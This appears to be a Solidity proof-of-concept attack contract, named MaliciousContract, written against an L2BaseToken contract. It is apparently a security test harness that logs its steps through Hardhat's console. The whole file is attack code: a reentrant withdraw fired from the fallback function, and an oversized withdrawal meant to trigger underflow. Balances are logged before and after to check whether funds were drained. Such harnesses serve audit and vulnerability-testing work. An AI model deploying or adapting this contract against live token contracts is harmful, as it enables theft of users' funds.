// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./L2BaseToken.sol";
import "hardhat/console.sol";

contract MaliciousContract {
    L2BaseToken public target;
    bool public attackExecuted;
    
    // Function to set the target contract after deployment
    function setTarget(address _target) external {
        target = L2BaseToken(_target);
    }
    
    // Fallback function that will be called when the target contract tries to interact with this contract
    fallback() external payable {
        if (!attackExecuted) {
            attackExecuted = true;
            // Attempt to manipulate the target contract's state
            // This is where we would implement our attack logic
            // For example, we could try to:
            // 1. Manipulate balances
            // 2. Call other functions in the target contract
            // 3. Attempt to drain funds
            target.withdraw{value: msg.value}(address(this));
        }
    }
    
    // Function to initiate the attack
    function initiateAttack() external payable {
        require(address(target) != address(0), "Target not set");
        
        // Check balances before withdraw
        uint256 targetBalance = target.balanceOf(uint256(uint160(address(target))));
        console.log("target address", address(target));
        uint256 myBalance = target.balanceOf(uint256(uint160(address(this))));
        console.log("Target contract balance:", targetBalance);
        console.log("My contract balance:", myBalance);
        
        // Try to withdraw more than the contract's balance
        uint256 largeAmount = 10000000000000000000 + 1;  // 10 ETH + 1 wei, guaranteed to cause underflow
        console.log("Attempting to withdraw:", largeAmount);
        console.log("Receiver address:", address(this));  // Print our contract's address as the receiver
        
        try target.withdraw{value: largeAmount}(address(this)) {
            console.log("Withdraw succeeded");
        } catch Error(string memory reason) {
            console.log("Withdraw failed with reason:", reason);
        } catch (bytes memory lowLevelData) {
            console.log("Withdraw failed with low level data:");
            console.logBytes(lowLevelData);
        }
        
        console.log("Attack attempt completed");
        
        // Check if we caused an underflow
        uint256 newTargetBalance = target.balanceOf(uint256(uint160(address(target))));
        uint256 newMyBalance = target.balanceOf(uint256(uint160(address(this))));
        console.log("New target balance:", newTargetBalance);
        console.log("New my contract balance:", newMyBalance);
    }
    
    // Function to check if the attack was successful
    function checkAttackSuccess() external view returns (bool) {
        return attackExecuted;
    }
} 